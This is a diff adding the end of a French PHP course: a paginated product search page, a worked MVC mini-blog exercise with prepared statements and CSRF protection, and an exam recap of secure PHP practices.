+    $conditions[] = "categorie = :cat";
+    $params[':cat'] = $categorie;
+}
+
+$where = implode(' AND ', $conditions);
+
+// Compter
+$stmtCount = $pdo->prepare("SELECT COUNT(*) FROM produits WHERE $where");
+$stmtCount->execute($params);
+$total = (int) $stmtCount->fetchColumn();
+$nombrePages = max(1, (int) ceil($total / $parPage));
+$page = min($page, $nombrePages);
+$offset = ($page - 1) * $parPage;
+
+// Recuperer les resultats
+$stmt = $pdo->prepare("SELECT * FROM produits WHERE $where ORDER BY nom LIMIT :lim OFFSET :off");
+foreach ($params as $k => $v) {
+    $stmt->bindValue($k, $v);
+}
+$stmt->bindValue(':lim', $parPage, PDO::PARAM_INT);
+$stmt->bindValue(':off', $offset, PDO::PARAM_INT);
+$stmt->execute();
+$produits = $stmt->fetchAll();
+
+// Categories pour le filtre
+$stmtCat = $pdo->prepare("SELECT DISTINCT categorie FROM produits WHERE categorie IS NOT NULL ORDER BY categorie");
+$stmtCat->execute();
+$categories = $stmtCat->fetchAll(PDO::FETCH_COLUMN);
+
+// Parametres URL pour la pagination
+$paramsUrl = http_build_query(array_filter(['q' => $recherche, 'cat' => $categorie]));
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Recherche produits</title></head>
+<body>
+    <h1>Recherche de produits</h1>
+
+    <form method="GET">
+        <input type="text" name="q" value="<?= htmlspecialchars($recherche) ?>" placeholder="Rechercher...">
+        <select name="cat">
+            <option value="">Toutes les categories</option>
+            <?php foreach ($categories as $cat): ?>
+                <option value="<?= htmlspecialchars($cat) ?>" <?= $categorie === $cat ? 'selected' : '' ?>>
+                    <?= htmlspecialchars($cat) ?>
+                </option>
+            <?php endforeach; ?>
+        </select>
+        <button type="submit">Rechercher</button>
+    </form>
+
+    <p><?= $total ?> resultat(s) trouve(s)</p>
+
+    <?php if (empty($produits)): ?>
+        <p>Aucun produit ne correspond a votre recherche.</p>
+    <?php else: ?>
+        <table border="1" cellpadding="5">
+            <tr><th>Nom</th><th>Prix</th><th>Categorie</th><th>Stock</th></tr>
+            <?php foreach ($produits as $p): ?>
+            <tr>
+                <td><?= htmlspecialchars($p['nom']) ?></td>
+                <td><?= number_format($p['prix'], 2, ',', ' ') ?> EUR</td>
+                <td><?= htmlspecialchars($p['categorie'] ?? '-') ?></td>
+                <td><?= $p['stock'] ?></td>
+            </tr>
+            <?php endforeach; ?>
+        </table>
+
+        <?php if ($nombrePages > 1): ?>
+        <nav>
+            <?php if ($page > 1): ?>
+                <a href="?page=<?= $page - 1 ?>&<?= $paramsUrl ?>">Precedent</a>
+            <?php endif; ?>
+
+            <?php for ($i = 1; $i <= $nombrePages; $i++): ?>
+                <?php if ($i === $page): ?>
+                    <strong>[<?= $i ?>]</strong>
+                <?php else: ?>
+                    <a href="?page=<?= $i ?>&<?= $paramsUrl ?>"><?= $i ?></a>
+                <?php endif; ?>
+            <?php endfor; ?>
+
+            <?php if ($page < $nombrePages): ?>
+                <a href="?page=<?= $page + 1 ?>&<?= $paramsUrl ?>">Suivant</a>
+            <?php endif; ?>
+        </nav>
+        <p>Page <?= $page ?> / <?= $nombrePages ?></p>
+        <?php endif; ?>
+    <?php endif; ?>
+</body>
+</html>
+```
+
+---
+
+### Exercice 12 -- Synthese : Mini-application de blog
+
+**Enonce :** Concevoir une mini-application de blog en architecture MVC avec : page d'accueil listant les 5 derniers articles, page de detail d'un article, formulaire d'ajout avec protection CSRF, systeme de categories, compteur de vues sur chaque article.
+
+**Solution :**
+
+```sql
+-- Schema de base de donnees
+CREATE TABLE categories (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    nom VARCHAR(50) NOT NULL UNIQUE
+);
+
+CREATE TABLE articles (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    titre VARCHAR(200) NOT NULL,
+    contenu TEXT NOT NULL,
+    categorie_id INT,
+    vues INT DEFAULT 0,
+    date_creation DATETIME DEFAULT CURRENT_TIMESTAMP,
+    FOREIGN KEY (categorie_id) REFERENCES categories(id)
+);
+```
+
+```php
+<?php
+// Models/Article.php
+class Article {
+    private PDO $pdo;
+
+    public function __construct(PDO $pdo) {
+        $this->pdo = $pdo;
+    }
+
+    public function findRecent(int $limite = 5): array {
+        $stmt = $this->pdo->prepare("
+            SELECT a.*, c.nom AS categorie_nom
+            FROM articles a
+            LEFT JOIN categories c ON a.categorie_id = c.id
+            ORDER BY a.date_creation DESC
+            LIMIT :limite
+        ");
+        $stmt->bindValue(':limite', $limite, PDO::PARAM_INT);
+        $stmt->execute();
+        return $stmt->fetchAll();
+    }
+
+    public function findById(int $id): array|false {
+        $stmt = $this->pdo->prepare("
+            SELECT a.*, c.nom AS categorie_nom
+            FROM articles a
+            LEFT JOIN categories c ON a.categorie_id = c.id
+            WHERE a.id = :id
+        ");
+        $stmt->execute([':id' => $id]);
+        return $stmt->fetch();
+    }
+
+    public function incrementerVues(int $id): void {
+        $stmt = $this->pdo->prepare("UPDATE articles SET vues = vues + 1 WHERE id = :id");
+        $stmt->execute([':id' => $id]);
+    }
+
+    public function create(array $data): int {
+        $stmt = $this->pdo->prepare("
+            INSERT INTO articles (titre, contenu, categorie_id)
+            VALUES (:titre, :contenu, :categorie_id)
+        ");
+        $stmt->execute([
+            ':titre' => $data['titre'],
+            ':contenu' => $data['contenu'],
+            ':categorie_id' => $data['categorie_id'] ?: null,
+        ]);
+        return (int) $this->pdo->lastInsertId();
+    }
+
+    public function getCategories(): array {
+        $stmt = $this->pdo->prepare("SELECT * FROM categories ORDER BY nom");
+        $stmt->execute();
+        return $stmt->fetchAll();
+    }
+}
+```
+
+```php
+<?php
+// Controllers/BlogController.php
+class BlogController {
+    private Article $model;
+
+    public function __construct(PDO $pdo) {
+        $this->model = new Article($pdo);
+    }
+
+    public function index(): void {
+        $articles = $this->model->findRecent(5);
+        $titre = "Accueil du blog";
+        require __DIR__ . '/../Views/blog/index.php';
+    }
+
+    public function show(): void {
+        $id = (int) ($_GET['id'] ?? 0);
+        $article = $this->model->findById($id);
+
+        if (!$article) {
+            http_response_code(404);
+            echo "Article non trouve";
+            return;
+        }
+
+        $this->model->incrementerVues($id);
+        $article['vues']++; // Refleter l'increment dans l'affichage
+
+        $titre = $article['titre'];
+        require __DIR__ . '/../Views/blog/show.php';
+    }
+
+    public function create(): void {
+        $erreurs = [];
+        $categories = $this->model->getCategories();
+        $data = ['titre' => '', 'contenu' => '', 'categorie_id' => ''];
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            // CSRF
+            if (!isset($_SESSION['csrf']) || !hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
+                die("Token CSRF invalide");
+            }
+
+            $data['titre'] = trim($_POST['titre'] ?? '');
+            $data['contenu'] = trim($_POST['contenu'] ?? '');
+            $data['categorie_id'] = (int) ($_POST['categorie_id'] ?? 0);
+
+            if (empty($data['titre'])) $erreurs[] = "Titre obligatoire";
+            if (mb_strlen($data['contenu']) < 20) $erreurs[] = "Contenu : 20 caracteres minimum";
+
+            if (empty($erreurs)) {
+                $id = $this->model->create($data);
+                unset($_SESSION['csrf']);
+                header("Location: ?action=show&id=$id");
+                exit;
+            }
+        }
+
+        $_SESSION['csrf'] = bin2hex(random_bytes(32));
+        $titre = "Nouvel article";
+        require __DIR__ . '/../Views/blog/create.php';
+    }
+}
+```
+
+```php
+<?php
+// Views/blog/index.php
+?>
+<h1>Blog</h1>
+<a href="?action=create">Ecrire un article</a>
+<?php foreach ($articles as $a): ?>
+<article style="border:1px solid #ccc; padding:10px; margin:10px 0;">
+    <h2><a href="?action=show&id=<?= $a['id'] ?>"><?= htmlspecialchars($a['titre']) ?></a></h2>
+    <p style="color:#666;">
+        <?= htmlspecialchars($a['categorie_nom'] ?? 'Non categorise') ?>
+        | <?= date('d/m/Y', strtotime($a['date_creation'])) ?>
+        | <?= $a['vues'] ?> vue(s)
+    </p>
+    <p><?= htmlspecialchars(mb_substr($a['contenu'], 0, 200)) ?>...</p>
+</article>
+<?php endforeach; ?>
+```
+
+```php
+<?php
+// Views/blog/show.php
+?>
+<a href="?action=index">Retour</a>
+<article>
+    <h1><?= htmlspecialchars($article['titre']) ?></h1>
+    <p style="color:#666;">
+        Categorie : <?= htmlspecialchars($article['categorie_nom'] ?? 'Non categorise') ?>
+        | Publie le <?= date('d/m/Y a H:i', strtotime($article['date_creation'])) ?>
+        | <?= $article['vues'] ?> vue(s)
+    </p>
+    <div><?= nl2br(htmlspecialchars($article['contenu'])) ?></div>
+</article>
+```
+
+```php
+<?php
+// Views/blog/create.php
+?>
+<h1>Nouvel article</h1>
+<a href="?action=index">Retour</a>
+
+<?php if ($erreurs): ?>
+    <ul style="color:red;">
+        <?php foreach ($erreurs as $e): ?><li><?= htmlspecialchars($e) ?></li><?php endforeach; ?>
+    </ul>
+<?php endif; ?>
+
+<form method="POST">
+    <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
+
+    <label>Titre :<br><input type="text" name="titre" value="<?= htmlspecialchars($data['titre']) ?>" required></label><br><br>
+
+    <label>Categorie :<br>
+        <select name="categorie_id">
+            <option value="0">-- Aucune --</option>
+            <?php foreach ($categories as $cat): ?>
+                <option value="<?= $cat['id'] ?>" <?= $data['categorie_id'] == $cat['id'] ? 'selected' : '' ?>>
+                    <?= htmlspecialchars($cat['nom']) ?>
+                </option>
+            <?php endforeach; ?>
+        </select>
+    </label><br><br>
+
+    <label>Contenu :<br><textarea name="contenu" rows="10" cols="60" required><?= htmlspecialchars($data['contenu']) ?></textarea></label><br><br>
+
+    <button type="submit">Publier</button>
+</form>
+```
+
+```php
+<?php
+// index.php (point d'entree)
+session_start();
+
+$pdo = new PDO("mysql:host=localhost;dbname=blog_db;charset=utf8mb4", "root", "", [
+    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    PDO::ATTR_EMULATE_PREPARES => false,
+]);
+
+require_once 'Models/Article.php';
+require_once 'Controllers/BlogController.php';
+
+$ctrl = new BlogController($pdo);
+$action = $_GET['action'] ?? 'index';
+
+match ($action) {
+    'index'  => $ctrl->index(),
+    'show'   => $ctrl->show(),
+    'create' => $ctrl->create(),
+    default  => $ctrl->index(),
+};
+```
+
+---
+
+## Recapitulatif des points essentiels pour l'examen
+
+1. **PHP est un langage serveur** : le navigateur ne recoit que du HTML
+2. **Typage dynamique** mais typage strict possible avec `declare(strict_types=1)`
+3. **PDO est obligatoire** pour acceder a MySQL (jamais `mysql_*` ni `mysqli_*` sans preparation)
+4. **Requetes preparees toujours** : `prepare()` + `execute()` avec marqueurs
+5. **htmlspecialchars()** sur toute donnee affichee dans le HTML (protection XSS)
+6. **password_hash() / password_verify()** pour les mots de passe (jamais md5 ni sha1)
+7. **Sessions** : `session_start()` avant tout output, `session_regenerate_id()` apres connexion
+8. **Validation** : toujours valider et sanitizer les entrees utilisateur
+9. **Architecture MVC** : separation Modele (donnees), Vue (affichage), Controleur (logique)
+10. **Gestion d'erreurs** : `try/catch` pour PDO, `error_reporting(E_ALL)` en developpement
